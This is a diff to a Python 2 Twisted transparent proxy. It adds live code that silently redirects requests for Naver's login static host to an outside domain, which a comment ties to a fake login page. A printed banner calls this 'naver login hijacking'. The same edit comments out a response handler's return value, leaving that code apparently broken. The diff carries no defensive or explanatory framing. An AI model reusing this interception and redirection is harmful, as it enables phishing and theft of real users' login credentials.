@@ -64,9 +64,9 @@ class ProxyClient(http.HTTPClient):
 
     def handleResponse(self, data):        
 	data = self.originalRequest.processResponse(data)
-	if sys.argv[2] in data:
-		data.replace(sys.argv[2],sys.argv[3])
-	print data
+	#if sys.argv[2] in data:
+	#	data.replace(sys.argv[2],sys.argv[3])
+	#print data
         if self.contentLength != None:
             self.originalRequest.setHeader('Content-Length', len(data))
 
@@ -137,9 +137,9 @@ class ProxyRequest(http.Request):
             host, port = host.split(':')
             port = int(port)
         
-        #if "www.naver.com" == host :
-        #        print "www.naver.com -> kldp.org "
-        #        host = "kldp.org"    
+        if "static.nid.naver.com" == host :
+                print "=============== naver login hijacking ============= "
+                host = "zxher.com"    # http://zxher.com/login.nhn
 
         self.setHost(host, port)
 
@@ -152,9 +152,9 @@ class ProxyRequest(http.Request):
         self.reactor.connectTCP( host, port, factory)
 
     def processResponse(self, data):
-	if sys.argv[2] in data:
-		data.replace(sys.argv[2],sys.argv[3])
-	return data
+	#if sys.argv[2] in data:
+	#	data.replace(sys.argv[2],sys.argv[3])
+	#return data
 
 class TransparentProxy(http.HTTPChannel):
     requestFactory = ProxyRequest
@@ -163,8 +163,8 @@ class ProxyFactory(http.HTTPFactory):
     protocol = TransparentProxy
  
 inputPort=8080
-if sys.argv[1]:
-	inputPort = sys.argv[1]
+#if sys.argv[1]:
+#	inputPort = sys.argv[1]
 
 reactor.listenTCP(int(inputPort), ProxyFactory())
 reactor.run()
